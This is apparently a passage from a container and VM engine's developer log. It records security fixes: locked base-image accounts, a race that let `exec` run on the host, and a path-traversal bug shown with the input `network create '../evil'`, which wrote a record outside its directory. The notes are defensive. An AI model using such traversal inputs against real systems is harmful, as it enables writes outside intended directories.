  libtest runs the cases by name, so a single invocation never honoured the order the header asked
  for. A NON-ignored test reads `live.rs` and fails if a case that touches the firewall doesn't
  have `firewall` in its name. The probe (`provider describe proxmox --probe`) reads `GET /version`
  and says when the node's release isn't the matrix's (`MATRIX_RELEASE`, 9.2.2). Matrix: 184/675
  calls, 179 in a live trace.

**Not validated in this slice**: the three-node `ngola-lda` cluster (slice 3's target) was not
touched — the run was against a libvirt VM booted from this repo's `proxmox-ve_9.2` appliance; a
fabric with more than one node, OSPF, a real NetBox/PowerDNS behind the controllers and a DHCP
lease handed to a guest remain unmeasured; the
`ip()` via the agent still needs a prepared guest
(`DELONIX_PROXMOX_TEST_AGENT_VMID`); and why the lock stays stuck ~25 s after a
`qmstart` on a guest with no OS wasn't isolated — only measured.

## The base image carries no credentials, and it says what's inside (2026-08-18)

Review of `delonix-vm-base` against what a cloud demands of a base image. Seven gaps;
five are code and are closed, two are decisions (signing ADR and multi-arch).

- **No account carries a password.** Root and `delonix` had `delonix`, written in this PUBLIC
  repository — a credential that lives in an open repo isn't a credential, and the account has
  passwordless sudo, so whoever reached a login prompt was root. The previous mitigation (turning
  off password login over SSH and keeping the serial console open "for when the VM loses the
  network") holds for a lab VM and stops holding the instant the SAME artefact is published: on a
  shared hypervisor the console is no lesser door than SSH. The two accounts are locked
  (`passwd -l`) and the supported entry paths stay intact — the SSH key cloud-init injects and the
  one `cluster kubeadm` generates. `--root-password` exists for whoever truly needs the serial
  console to accept a login: an explicit choice by whoever builds, and it lives only in that image.
- **`qemu-guest-agent` in all three recipes.** It was only in the golden's offline recipe, so
  `delonix-vm-base` came out with no agent: without it the hypervisor doesn't discover the IP,
  doesn't freeze the filesystem for a consistent snapshot, and an orderly shutdown becomes a power
  cut. The `enable` is done by us and not trusted to the package's postinst — that runs
  `deb-systemd-helper` against a guest where systemd isn't running, which is an assertion about
  someone else's script and not a measurement.
- **The journal was volatile**, so a reboot erased the logs of the boot that failed. It's now
  persistent on all four distros, **with a ceiling** (200 MiB) — this host has already had
  disk-pressure, and an unbounded journal on a tenant's 10 GiB root is filling it with our own
  logs.
- **Metrics agent OPT-IN** (`--node-exporter[=<addr>]`). Without the flag the image opens no
  port: a listener in every published copy is a port the tenant never asked for. AWS and GCP put
  the guest agent on by default and leave the metrics one to be enabled. The version is PINNED —
  a floating `latest` would make two builds of the same recipe give different images.
- **Inventory and provenance.** `/usr/share/delonix/packages.tsv` inside the image and in a
  sidecar next to the qcow2 (name, version, arch — the content an SPDX carries, in the form the
  guest produces without a new tool), plus `/etc/delonix-image-release` with base + sha256 of the
  base, which `delonix` built, k8s, offline and extra-packages. Without this, "is this version
  here?" forces you to mount the image. **It's not a promise of a reproducible build** — apt/dnf
  resolve against a moving archive; pinning every transitive version would require a snapshot
  mirror, which is a platform decision and not a flag of this command.
- **The disk was already closed** by `GOLDEN_DISK_SIZE_GIB = 10` (2026-08-17): the measurement
  that raised the gap was of an image built on 2026-08-12, before that fix. It holds as method —
  measure the artefact that's published, not the one in the store.

**A test trap paid twice in the same pass**: two tests pinned POSITIONS in the recipe's tail
(`ops[len-2]` is the apt cleanup) and failed because the tail grew (journal, inventory). What they
mean is ORDER — the cleanup after everything that installs, the machine-id reset last — and that's
how they're written now.

**Validated live** against a real Ubuntu 24.04 guest (`virt-customize --no-network` over a copy of
the published image), and against the RESULT and not the rc: 669 packages with real TABs and
sorted, the journal drop-in with real newlines, and `root`/`delonix` with `!` in front of the hash
in `/etc/shadow`. **Not validated**: a complete end-to-end build with `--network` (needs the
passt host workarounds already documented), and `--node-exporter` against a Prometheus actually
scraping.

## An `exec` right after `run -d` ran on the HOST (2026-08-28)

Reported as "`exec` writes to the ROOTFS's `/data` instead of to the volume". **The measurement
says something else, and worse**: the `exec` that catches the window runs on the **HOST's
filesystem**. It's not the wrong destination inside the container — it's outside it.

The proof, with two paths that can't coexist (`/etc/alpine-release` only exists in the container,
`/tmp/dlx-race/` only exists on the host): 3 of 12 runs answered `NAO-CONTAINER` and **two
created real files in the host's `/tmp`**, with **exit 0**. That is, the `exec` executed the
host's `/bin/sh` — the error message gave it away before the probe: `sh: 1: cannot create
/data/f.txt: Directory nonexistent` is Ubuntu's `dash`, not alpine's busybox, and the following
`cat` was already answering with busybox's wording.

**The cause**: on the `detach` path the `spawn` returned right after releasing the init (the "GO"
byte of the userns handshake), and it's only AFTER that the init does `setup_rootfs` — the volume
binds, the `pivot_root`, the `/dev`, the tmpfs, the secret files. The `exec` does `setns` into the
container's `mnt`, which exists since the `clone`: entering before the `pivot_root` is entering a
mount namespace whose root is still the host's.

**Why it passed for days as flakiness**: it's silent whenever the path exists on both sides. A
backup taken in that window archives an empty volume, and the failure shows up two steps ahead, at
the "the data came back" check, pointing at the restore — which was fine.

**The exit chosen was to close the window at the source** (`run -d` only returns with the mounts
up), and not to make `exec` refuse until they were. Three reasons, in order of weight: `exec`
isn't the only one entering via `setns`/`/proc/<pid>/root`, so the refusal would have to be
repeated in every consumer; refusing returns the cost to the caller, which is exactly the
write-and-reread band-aid the battery had already placed and which this work exists to remove; and
the mechanism already has precedent with the reason written in the same file — `reexec_mapped_hold`
already waits for the proof that the mount is up, by the same "empty-answer-in-silence".

- **An `O_CLOEXEC` pipe**, written by the init right after the last mount
  (`apply_readonly_paths`) and read by the `spawn` as the LAST thing before returning. The CLOEXEC
  is what carries the bad case: if the init dies, or reaches `execvp` without writing, the fd
  closes and the parent reads EOF instead of waiting forever.
- **Deliberately before `chown_tree_once`** (which walks the entire rootfs for an image with
  `USER` ≠ root) and before the caps/seccomp/apparmor: none of that changes what an intruder sees,
  and making `run -d` wait for a full-tree chown traded a real defect for a visible slowness.
- **Zero reordering of what already existed** — the userns handshake, the console's `recv_fd` and
  the log shim have an order the comments call CRITICAL, and this wait needs none of them: it just
  needs to be last.
- **A 60s ceiling with a loud warning**, never an endless wait: a mount that hangs (a bind over an
  NFS that doesn't answer) can't hang the `run`, because before this it didn't hang. And the
  warning is said, because that's exactly where the following `exec` could land on the host.
- **What did NOT change at that moment, on purpose — and did change later, with its own
  measurements (2026-09-16)**: a `run -d` whose init dies while mounting answered **rc=0** over a
  dead container. Measured on P1b (Ubuntu 24.04 with the userns restriction, binary with no
  AppArmor profile): `run -d` rc=0, and the following `exec` said "not running". Now the wait tells
  three outcomes apart (`MountWait`: byte, EOF, ceiling), and an **EOF on a detached boot is an
  error**: the `spawn` reaps the init (it's the parent), returns the real code and **quotes the
  init's log** (`failed to prepare the rootfs: EPERM`), without publishing a record. The ceiling
  never counts as a failure. In the foreground nothing changes — `waitpid` already returned 126.
  **The fix opened a leak, caught on validation**: with no record, the container's directory
  (overlay and log) was orphaned on every attempt, because `rm` and `prune` find containers via
  the record. `discard_unstarted` (`cmd/container.rs`) removes it when the boot fails AND there's
  no record — with a record it touches nothing. Validated on the same VM: three failures leave
  zero records, zero directories and zero processes, and the path with a profile still boots.

**Measured, same probe, same machine**: before, 5 of 54 runs outside the container; after, 0 of
54, and 0 of 36 more under load. `run -d` latency: median 102 → 95 ms — indistinguishable from
noise, because the mounts already ran in parallel with the work the parent did after the GO.

**The second half: the RECORD also lied, and that one doesn't pass through `run -d`.** I logged it
first as acceptable residue and the measurement contradicted me — the `store.save(Running)`
happened before the proof, and it's the `pid` + `Running` in the store that a THIRD party reads to
decide the container is there to be entered (the CRI, the `serve docker-api`, a concurrent CLI),
none of them passing through the `run` that waits. Measured **on the already-fixed binary**: in 2
of 15 runs, at the instant the record gained a `pid`, the `/proc/<pid>/root` was still the host's.
The save moved to after the proof; 55/55 after that.

- **How it was measured, and it's the reusable part**: not by timing luck, but as a PROPERTY — a
  spy that polls the JSON and, as soon as it sees the `pid`, compares `/proc/<pid>/root` with `/`
  (two `stat`s, starting no process at all). An `exec` takes ~50 ms to start and so almost never
  reaches the window: that's how this residue escaped the first pass, with a spy that invoked the
  CLI and gave 0/15 on a defect that was right there.
- **`setup_cgroup` was NOT moved with it**: it's where the container's limits hang from, and every
  millisecond outside a cgroup is a millisecond running with no ceiling. Mounting allocates
  nothing, so waiting first would buy no safety and cost that.
- **A side effect, in the right direction**: a network hook that fails now leaves the record
  untouched, instead of saying `Running` for a process it just SIGKILL'd itself.

**The gates are TWO, and neither replaces the other.** The
`the_mount_wait_has_three_exits_and_none_is_unbounded` proves, deterministically, that
the wait exists and that the three exits (byte, EOF, ceiling) are all finite — verified by the
repo's rule: with the function returning immediately, it fails on "should have waited ~120ms and
given up, waited 721ns". The battery check proves the LINK, which the unit test doesn't reach.

**And the battery gate admits what it is: sampling.** What decides the race is the child being
scheduled before the `exec` — a NEW process — reaches the `setns`, so the rate tracks CPU
contention and **not** the number of mounts: measured on the defective binary, 0/20 with the
machine idle, 0/20 with 40 volumes, 4–7/20 with `nproc` workers burning CPU. That's why the check
generates load and runs 12 cycles — 93% to 99.8% detection, against practically 0% without it, and
verified 3/3 failing the previous binary (always on the 1st or 2nd cycle) and 3/3 passing the
fixed one. A check that caught this one in every three runs would be worse than none: it would read
as green.

**The third check is the record's, and it's DETERMINISTIC** — it measures the property instead of
sampling the race, with the same two-`stat` spy above. Verified on the case that separates the
two: against a binary WITH the wait but with the save in the old place, it fails 3/3 (always on
cycle 1) while the window check stays green. That's what proves they cover different halves, and
not the same thing twice.
## The providers' capability catalogue, and `delonix provider ls` (ADR-0050, 2026-09-23)

Request: manage VMs and infra through an interface of our own, with MEASURED parity
against the ProxmoxProvider — support, explicit degradation, or refusal per provider. The first
measurement pinned down the problem: the node contract already had `Capability`/`ProviderInfo`
(`common.proto`) and **nothing in Rust produced one**; the `VmBackend` said what it does not know
how to do through default methods that refuse (`unsupported_pause`/`unsupported_snapshot`),
i.e. you only found out by trying; and `ListProviders` had a shape and no handler.

- **The denominator is the engine's catalogue, in code** —
  `delonix_compute::capability::Capability`, **100 entries**, catalogue `1.0.0`, stable
  dotted names (`vm.snapshot.memory`, `net.namespace-isolation`), by domain
  and by port type. A report is built by walking `Capability::ALL` with a
  `match` **with no wildcard arm**: a new entry does not compile in any provider until
  it answers. It is the same property as the Kinds table and the exit-code map.
- **Six states, and `supported` does not self-certify.** `Supported { evidence }` names
  a `check:`/`e2e:` from the battery, a `chaos:`, a `test:` or a `live:`, and the test
  `every_supported_capability_cites_evidence_that_exists` greps each one. A
  capability with code and no proof is `partial`, and that is the honest state of MOST
  of the VM matrix today (the battery exercises snapshot/pause/stop/start and almost nothing
  else of the VM surface). `unavailable-on-host` is not declared: it is what a declared yes
  turns into when the host probe fails (`on_host`), with the missing piece
  named; a declared no never turns into a host no.
- **Four declarations, three with a probe**: libvirt (`virsh`, `qemu`, `/dev/kvm`,
  `qemu:///system` — a session-only host loses the lines that need an observed IP),
  cloud-hypervisor (binary, kvm, firmware — "selectable" and "boots" are different
  facts), proxmox (**declared and never probed**: `provider ls` connects to
  nothing, health says `NotProbed`), and linux **three times** under one id — compute
  (`delonix-linux`), network (`delonix-sdn`, with `br_netfilter` asked of the
  HOLDER because the sysctl is per-netns) and storage (`delonix-volume`).
- **The report goes in `BackendRegistration.report`** (a `ReportFactory`, like
  `new`), never in a default method of the trait — "never a default method that quietly
  does nothing" (ADR-0044 D3) — and never called at registration (ADR-0008: registering does no
  I/O). When P4b moves the port, `capabilities()` returns this as-is.
- **`provider ls|describe|matrix`**: `ls` and `describe` measure on this host; `matrix`
  prints the DECLARED view from which `docs/providers/capability-matrix.md` is generated, and
  `the_published_matrix_is_the_generated_one` keeps the file equal to the output —
  regenerate with `delonix provider matrix > docs/providers/capability-matrix.md`. The JSON
  of `ls` has the contract's `ProviderInfo` fields plus `catalog_version`.
- **`virsh` has its own number, and it is another question.**
  `scripts/libvirt_virsh_inventory.py` reads the `virsh help` of a named version
  (denominator: 276 in libvirt 10.0.0) and the sources that invoke it (numerator: **31**,
  11.2%), with excluded ones for a reason (virsh's own shell, `iface-*`, the ADR-0031
  migration). Pools/volumes/nodedev/checkpoint/events are **missing, not excluded**.
  The first version counted only single-line argv and missed FIVE (`net-update`,
  `nwfilter-define`, `snapshot-delete`/`-dumpxml`/`-create` are multi-line `vec![`) —
  caught by comparing against the by-hand list, fixed by joining the block onto the first line.
- **What was left out, and why**: the readback over the node contract waits for the
  `delonix-node-api` (the `delonix-mgmt` is frozen by ADR-0041 D4 — a new route
  there is a route to migrate tomorrow); refusal by name in the request
  (`required_capabilities`/`--require`) is the next slice, and it needs the right `DX-`
  code first (`vm.unsupported_by_backend` is DX-1501, class *invalid*, and the contract
  says `FAILED_PRECONDITION`); the raw libvirt XML stays `partial` with the trust model
  written down and **cannot travel** in `ProviderExtensions`.

**Side finding in `pt.po`**: a `msgid` entry contained the output of a failed
test pasted after the text (2 KB of `thread … panicked`), pre-existing on
`main`. Removed in this pass; a `msgid` nobody searches for does no harm, but it is
garbage in the catalogue.

### The `partial` lines of libvirt and CH became `supported` with real checks (2026-09-24)

ADR-0050 said the VM matrix had more `partial` than `supported`
because the battery only exercised snapshots, pause and stop/start. This pass
wrote the missing checks — libvirt goes from 15 to **25** `supported`
(14 `partial`), the Cloud Hypervisor from 12 to **19** (10 `partial`) — and each
promoted line cites by TITLE a check in `scripts/e2e.sh` that the evidence gate
confirms exists. Two sections: "vm: what the libvirt report declares
supported, measured (ADR-0050)" boots a VM by manifest (`kind:
VirtualMachine` with `extraDisks`/`extraNics`/`cpuModel`/`cpuTopology`/
`cpuAffinity`/`vnc`/`ip`) and reads the LIVE domain — `domblklist`, `domiflist`,
`dumpxml`, `net-dumpxml` — never the XML the engine wrote; the CH section gained
pause/resume read from the VMM api-socket, restart by PID, backup/restore with the
VM stopped, `vm rm`, and anti-spoof read from the ruleset INSIDE the holder. The guest
is a deliberately empty qcow2: what needs an OS inside (cloud-init, observed
IP, agent) stays `partial` with the reason written down. 78/78 live with
isolated root (`OUT=/tmp/dlxpe`, short — the scratchpad root was 145 bytes and
CH refuses a UNIX socket longer than 107).

**Three real defects, and none was visible from reading the code — all three only
the battery showed, on the first run:**

1. **A CH VM in the `default` namespace had no anti-spoof and was not in
   `@dlxall`.** The `vmtap` line went in the short form (no IP) for `default`, "so
   that an old holder keeps serving it", and audit #3 — which closed the
   "tap" anti-spoof — only covered the VMs WITH a namespace. Measured in the holder:
   zero `saddr !=` rules for the tap, and the IP outside the set that every
   cross-namespace cutting rule consults; a `default` container gets both things
   from `do_attach`. Fixed in `vmtap_line`: the long form goes whenever there is a
   lease, `default` included (the holder accepts six tokens since v0.40.0). **The
   test `vmtap_line_mantem_a_forma_curta_sem_namespace` encoded the bug** —
   it asserted the short form for `default` with a lease — and was rewritten.
2. **`backup create vm` of a running libvirt VM failed with a second
   disk**: `--disk-only` snapshots ALL disks unless each one
   is named, so libvirt asked for a pre-created overlay for `vdb`
   ("missing existing file for disk vdb") — and left behind the `vda` overlay that
   we pre-created. `backup_disk_live` now sends `snapshot=no`
   for each other disk and deletes the staged file if the snapshot fails.
3. **`vm vnc` printed `127.0.0.1:0`** when `virsh vncdisplay` answered in the
   form `host:N` — only the form `:N` was normalized to `5900+N`. Two spellings
   of the same fact gave two addresses; `vnc_addr` (pure, tested) reads both.

**A `partial` that stayed for a measured reason**: `vm.tpm` in libvirt — on this host
(Ubuntu 24.04, libvirt 10.0) QEMU dies in `swtpm.sock: Permission denied`.
It is the ownership of the swtpm socket on the HOST, not the engine; the line says so instead of
faking a probe.

## The node contract gained a server: `delonix-node-api` and `ListProviders` (ADR-0050 D5, 2026-09-25)

Until now `proto/delonix/node/v1` was a contract without a single producer in Rust —
`delonix-cri` speaks CRI, `delonix-mgmt` speaks its own API, and ADR-0042
said step C waited "for the server to be built in another session".
This slice builds it to the measure of what already had a consumer: `NodeService.
ListProviders`, which is ADR-0050's D5 and the only RPC whose response the engine already
knew how to compute (`delonix provider ls -o json`).

- **One crate, not two.** ADR-0040 drew `delonix-node-proto` + `delonix-node-api`,
  both in `interfaces/`; the direction gate refuses one interface depending on another, and
  a crate of generated code with ONE consumer is the dead scaffolding that P1 of the same ADR
  had already refused. The stubs live in `delonix_node_api::proto::v1`, as the CRI keeps its own
  in `delonix_cri::cri`. When there is a second consumer (the conformance suite
  outside the crate, a client), it gets extracted.
- **The two encodings come out of the SAME files.** tonic/prost for the gRPC; `pbjson`
  for the proto3 JSON of every message, with `preserve_proto_field_names` because the
  published OpenAPI is generated with `naming=proto` — without it, the `catalog_version` of
  `openapi.yaml` arrived as `catalogVersion` on the socket. **Build trap**: the
  `tonic_build` already maps `.google.protobuf` to `prost_types`; for `pbjson_types`
  (which brings the serde of the well-known types) you need `compile_well_known_types(true)`
  BEFORE the `extern_path`, otherwise "duplicate extern Protobuf path".
- **One socket, two protocols**: the acceptor is `delonix-mgmt`'s (0600 + `SO_PEERCRED`
  per connection) with `hyper_util::server::conn::auto`, which speaks HTTP/1.1 for the
  JSON routes and HTTP/2 in prior knowledge for the gRPC. The router is an `axum::Router` with the route
  `GET /v1/providers` fused with `tonic::service::Routes::into_axum_router()`.
- **The contract gained two additive fields** — `Capability.state` and
  `ProviderInfo.catalog_version` — because the boolean `supported` alone lost the
  six-state classification that ADR-0050 exists to publish. `buf breaking`
  against v4.4.0 green; `openapi.yaml` regenerated by `contract_gate.py --update`.
- **The providers' composition is written twice, and the second copy has a guard.**
  The server cannot depend on the CLI's composition root (`cmd/provider.rs`), so it
  repeats the list; the test `the_declared_providers_are_the_published_matrix` compares the
  set (kind, id) of the server with what the CLI published in
  `docs/providers/capability-matrix.md`, and the battery runs `diff` between the socket JSON and
  `provider ls -o json` on the same host.
- **What is NOT served says so**: `GetNodeInfo`/`GetHealth`/`GetCapacity`/`WatchEvents`
  answer `UNIMPLEMENTED` with the ADR-0042 step that brings them; no other service of the
  contract is registered on the socket. A `GET /v1/node` gives a 404 from the router, not an empty 200.
- **Proven**: generated gRPC client calling the real server over the unix socket (with the
  kind filter, the `INVALID_ARGUMENT` refusal of an unknown kind and the `UNIMPLEMENTED`
  of `GetNodeInfo`); the JSON route by `oneshot`; the providers on the socket equal to the CLI's,
  in the battery (7 since ADR-0052, measured on 2026-09-26). **Not validated**: socket activation (ADR-0040 P5), the
  documentation routes of step C, and a client in another language against the OpenAPI.

## The node API gained mutations: the `Operation` registry and `CreateNetwork`/`DeleteNetwork` (ADR-0042 step E, slice E2, 2026-10-03)

- **The registry** (`delonix_node_api::operations`): one file per operation in
  `<root>/operations/<id>.json`, written `RUNNING` BEFORE the work and rewritten at the end. It keeps the
  pid and the `starttime` of whoever does the work; a read that finds an unfinished record whose
  owner no longer exists terminates it `FAILED` with reason `Interrupted` and records that (the server is
  socket-activated and has no one to do it for it). A finished record exits after seven days,
  when another operation begins.
- **Refusal first, operation after.** What is decided without touching anything is the error itself and writes
  no record: bad request, name already used (409), `etag` that does not match (412), network with something
  attached (409, DX-5307, naming what is attached). A failure of the WORK is the operation, `FAILED`,
  with the engine class in `error.reason` and the number in `error.metadata["dx"]`.
- **Idempotency**: `request_id` → id `r-<request_id>`, created exclusively by `link(2)`. The same
  request again receives the first operation — verified BEFORE the "already exists" of create and the
  "does not exist" of delete, which the first request made true. In REST, `Idempotency-Key` is the
  `request_id` and `If-Match` the `etag`; header and body in disagreement are refused.
- **REST response**: the `Operation` with `Location: /v1/operations/{id}`; 202 while running, 200
  when finished. The two network mutations finish before responding, so they respond 200 — read
  the `state`, not the status.
- **A single write path**: `delonix_sdn::netops` (`create_bridge`, `dependents_of`, `remove`)
  is what the CLI and the node API call. The `overlay` via the API is refused by name (501).
- **The dictionary number crosses the gRPC** in the `dx-number` metadata (`network_ops::status_of`),
  and `engine_error` reconstructs the error with it: the REST responds `DX-5307`, not a generic conflict.
- **Defect found and closed**: `NetworkStore::create_with_cidr` did not validate the name. Measured
  in v4.4.0: `network create '../evil' --subnet 10.231.0.0/24` wrote the record OUTSIDE
  `networks/` and exited 0. The validation moved to the store (`validate_name`), with a test.
- **The mutation tests do not touch the dataplane**: the `infra` follows the PROCESS root, so the
  unit tests inject the work (`create_with`/`delete_with`) and the proof with the real dataplane is the
  battery (`scripts/e2e_node_network_ops.py`, six scenarios). The gRPC test runs against the process
  root and only exercises refusals.
- **Not validated**: a server dead mid-create on a real socket (the `Interrupted` is
  proven with a hand-written record whose owner is a process that exited).

## Volume reads in the node API, and ADR-0059's F6 deferred (ADR-0042 step E, slice E3, 2026-10-03)

- **`GetVolume` and `ListVolumes`** in both encodings (`delonix_node_api::volumes`). Create and
  remove stay 501: removing a volume with subuid data goes through a CLI re-exec
  (`__rmtree`), which is the same question as F6.
- **Namespaces**: the store has the ownerless root (where every `volume create` falls) and a sub-tree
  per namespace (the shares). The contract has no "no namespace", so the root is reported in
  `default`, together with the `default` sub-tree; `*` lists everything. A name that exists in both places
  appears twice in the list and `GetVolume` refuses it (`FAILED_PRECONDITION`) — the same refusal
  that a workload gets when mounting that name.
- **Usage**: the `Get` measures (disk blocks, like `du`); the `List` does NOT measure — walking the data of
  every volume of a node on each listing is the cost already measured in the dashboard. `used_bytes` only
  exists when the measurement was complete, and the `UsageMeasured` condition says which of the three cases:
  `Measured`, `UnreadableDirectories` (subuid data, unreadable by the server's uid) or
  `NotMeasuredInList`. Unknown is never zero.
- **The `etag` is of the record, not of the usage**: writing data into a volume does not change what it is.
- **`page`** became a module (page size, token, escape, href, fnv), used by networks,
  volumes and operations — it was three copies.
- **Fix for #680**: an old `etag` answered `ABORTED`; the contract (`ResourceMeta.etag`)
  says `FAILED_PRECONDITION`. It now answers that, marked in the `stale-etag` metadata, and the REST
  stays 412.
- **ADR-0059's F6 deferred (owner's decision, 2026-10-03)**: `PlanStack`/`ApplyStack` on the socket
  wait for ADR-0040's P5; the `self_exec_sites` ratchet does not rise because of it. Addendum in ADR-0059.

## Storage pools: ADR-0067's P0 (`kind: StoragePool`, driver `dir`, 2026-10-03)

- **Who decides what**: the administrator declares the pools in an allowlist
  (`/etc/delonix/storage-pools.yaml`, or `DELONIX_STORAGE_POOLS_FILE`); a manifest only NAMES a
  pool. `driver`, `path`, `device` and the administrator's other fields in a `kind: StoragePool`
  are refused by name (DX-1217) at manifest load, before the unknown-field check
  — the same rule as the `SystemContainer` privilege fields.
- **The engine never creates nor destroys a pool.** `delete storagepools` stops using it; the directory and
  what is in it stay. With engine volumes inside, it refuses (DX-5201) and names them.
- **Ownership by mark, never by name**: each pool volume carries `.delonix-volume.json` with the owner
  (uid and state root). A directory with data and no mark is never adopted; an EMPTY directory
  with the volume's name is taken (it is what a dead apply between the `mkdir` and the mark leaves).
- **Refuse before filling**: above 95% pool occupancy nothing is allocated (DX-5202), and the sum
  of the allocated sizes does not exceed `overcommit.maxRatio` × capacity. A volume above the
  administrator's `maxVolumeBytes` is 77 (DX-7201).
- **The `delonix-storage` context does not bring a YAML parser**: the composition root
  (`cmd/storage_pool.rs`) hands it the decoder. The architecture gate refuses
  `serde_yaml` in a context.
- **The allowlist is refused** if the group or everyone can write to it, or if it is not owned by root nor by
  whoever runs the engine (DX-1218). Without an allowlist, a pool is 69 (DX-6203), never "there are no pools".
- **Gate**: the section "storage: kind StoragePool and volumes in a pool" of `scripts/e2e.sh` (12
  checks). The battery pool lives in `/dev/shm`: on the host disk, at 95%, the engine itself would refuse
  every allocation — the rule working, and covering up the other checks.
- **Not validated**: the helper and the block drivers (P1–P6, which need root and a lab VM),
  and a container writing into a pool volume.

## Golden rule: the engine compiles and answers on its own

The boundary is in "Engine identity and boundary", at the top. The practical consequences,
before any commit:

1. **No dependency from outside the workspace** that does not come from crates.io: this repo has to
   compile on its own, without access to anything private. `cargo tree -e normal` shows no
   `delonix-*` crate that is not listed in the root `Cargo.toml`.
2. **No notion of tenant, licence, billing or console.** If a change needs to know
   "who the customer is" or "what plan they have", that logic belongs to whoever consumes the engine.
3. **`Secret`/`SecretStore`/`CredVault`** (`delonix-state::secret`/`cred_vault`) are the engine's
   secret manager (`--secret`/`--secret-files`, Docker-style) — not a platform
   credential vault.
4. **`delonix-sdn` includes WireGuard** (`wg.rs`): it encrypts the inter-node VXLAN transport, it is genuine
   SDN. Deciding WHEN and FOR WHOM to publish ports in a multi-tenant fleet is not the
   engine's job.

## Architecture (41 crates in the `crates/` workspace)

| Crate | Responsibility |
|---|---|
| `delonix-node` | node context (ADR-0040 D2.2): the event registry (`events`), the host checks (`virt`), the peer credentials on a local socket (`peer_cred`), the dispatch contract between `delonix` and the sibling servers (`dispatch`) and the questions to the host and the processes (`now_unix`, `is_rootless`, `proc_starttime`, `safe_to_signal`, `generate_id`…). Together with `delonix-compute` and `delonix-model`, it received what `delonix-runtime-core` had — that crate ceased to exist (P3 gate) |
| `delonix-state` | persisted state (ADR-0040 P3): `Store`/`JsonStore` with `flock`, atomic write and the secret vault encrypted at rest (`SecretStore`/`CredVault`); own errors with a number in the dictionary (DX-4101, DX-18xx, DX-9003/9004). The pure model of the secret (`Secret`, name validation, `.env`) stayed in `delonix-model` |
| `delonix-telemetry` | observability: structured logging (`tracing`), OpenTelemetry/OTLP spans and the Prometheus metrics shared by the CRI and by `mgmt`. Left `delonix-runtime-core` in ADR-0040's P3: the foundation does not carry an exporter, and every crate that only needed a `Container` compiled an OTLP client |
| `delonix-linux` / `delonix-runtime-bin` | container runtime (clone/namespaces/cgroups, create/stop/exec, reconcile_status) + the complete `delonix` CLI (container/image/build/vm/volumes/network — see the "CLI" section above) |
| `delonix-model` | the PURE foundation of ADR-0040: what any layer names without depending on a mechanism. It has the shared error type and the `DX-CDNN` code dictionary (`error`, `codes`), the records that are only data (`records`: `Status`, `ContainerFw`/`FwRule` and their validators), the `typestate`, the secret model (`secret`), the generated names (`names`) and the exit classes (`exitcode`); `delonix-runtime-core` re-exports with the old paths |
| `delonix-stack` | Stack context (`core.delonix.io`, ADR-0040): the Kinds table (`kinds`), the 3-way reconciler (`reconcile`), the `Condition` type and the revision history (`revision`). Planning is pure; the `-bin` re-exports the modules with the old names (`cmd::kinds`…), so no caller changed. `manifest`/`stack`/`schema`/`compose` stay in the `-bin`: each one depends on 20 to 30 modules from there |
| `delonix-compute` | Compute context (`compute.delonix.io`, ADR-0040): the single-execution specification, `RunOpts`, which the CLI, the `Container`/`Pod` documents, the compose, the Docker API, the kind and the `App` produce before a single path executes. It also has the Pod-shape types (`pod`: `PodSpec`, `PodContainer`…) and their translators to `RunOpts`, which return the warnings as `Notice` instead of printing them — the `-bin` shows them with the translation catalogue, with the same text. And the pure validation of the specification (`preflight::check_run_opts`), which `cmd_run` calls before any effect. The rest of `cmd_run`, the flat shape `ContainerSpec` (normalized from raw YAML) and the translators of the compose and the Docker API stay in the `-bin`. Since ADR-0044's P4b.3b, also the VM use cases (`vm::VmEngine`: create, stop, start, status, list, remove and the day-2 verbs), generic over `StateRepository<Vm>` and the ports `VmBackends`/`LocalDiskImages`/`SeedBuilder`/`VmNetwork`; `delonix-vm` assembles the engine and keeps the public functions as wrappers. Since P4b.4a, also the VM backend registry (`vm_registry`: `seed`, `register_backend`, the auto-detection, `backend_for`, the `mac_for`), seeded by the composition root with the backends it trusts to answer `available()` locally |
| `delonix-sdn` | rootless SDN: holder netns + bridge + single slirp, DNAT/firewall nft, CNI compat, inter-node WireGuard overlay |
| `delonix-networking` | Networking context (`networking.delonix.io`, ADR-0059 D7): the network ports by role (`GatewayProvider`, `NetworkZoneProvider`), their registries by name and the ownership marks of the remote objects. They left `delonix-sdn` in ADR-0059's F2a, with the shape the `VmBackend` had in P4b.2; `delonix-sdn` re-exports the three modules, and OPNsense and Proxmox stopped depending on the native dataplane |
| `delonix-storage` | Storage context (`storage.delonix.io`, ADR-0067): the port a storage pool driver implements (`StoragePoolDriver`: probe, allocate, release, usage), the driver registry by name, the administrator's allowlist (`/etc/delonix/storage-pools.yaml`, read with the decoder that the composition root hands it — the context does not bring a YAML parser) and the ownership mark of a pool volume. The `dir` driver lives in `delonix-volume`; the block ones (btrfs, ZFS, LVM-thin) come in as provider crates |
| `delonix-net-rules` | PURE network rules, **zero dependencies** — `Cidr`, bridge name, IPAM inside a prefix, rate reading. It exists so the `delonix-paas` control-plane computes the SAME as the engine without a network hop in between; `delonix-sdn` re-exports everything, so no consumer had to change |
| `delonix-spiffe` | the node's SPIFFE identity as rustls material (ADR-0102, phase H0). It turns the three PEM artefacts a SPIFFE authority delivers — the X.509-SVID chain, its key and the trust bundle — into a rustls `ServerConfig`/`ClientConfig` that PRESENTS the node's SVID and VERIFIES a peer's by its `spiffe://` id, so an external authority such as SPIRE can be the issuer with no product-specific code here; `self_signed` keeps the engine's own CA as a first-class fallback with the same shape. It is NOT a SPIRE agent and NOT the Workload API — no resident process, no rotation loop (daemonless). **And it has no consumer in the workspace yet**: measured 2026-11-21, nothing outside the crate names it, which is what phase H0 means — the campaign that consumes it comes next |
| `delonix-oci` | OCI images: pull/registry/build, CNB buildpacks, internal registry, signature verification |
| `delonix-vm` | the VMs' composition root until P5 (ADR-0044 P4b.4): seeds the compute registry with the local backends, assembles the `VmEngine` per call (`JsonStore`, local disk and seed, network) and keeps the public functions as wrappers. Since P4b.4c it has no backend: the two local ones are provider crates |
| `delonix-provider-cloud-hypervisor` | Cloud Hypervisor `VmBackend` backend (one microVM per process, via the api-socket), with its ADR-0050 declaration, the host probe and the offline snapshots. Left `delonix-vm` in P4b.4c; it reaches the node network through `delonix_compute::vm_registry::network()`, and the composition root seeds it with `registration()` |
| `delonix-provider-libvirt` | libvirt/KVM `VmBackend` backend (QEMU via `virsh`), with its ADR-0050 declaration, the host probe, the hot backup and the domain without a registry. Left `delonix-vm` in P4b.4b; it depends only on the foundation and the contexts, and the composition root seeds it with `registration()` |
| `delonix-provider-proxmox` | remote `VmBackend` backend against the API of ONE Proxmox VE node (ADR-0008). Outside `delonix-vm` because an HTTP client does not go into an engine crate; registered by the `-bin`, which is who knows the target |
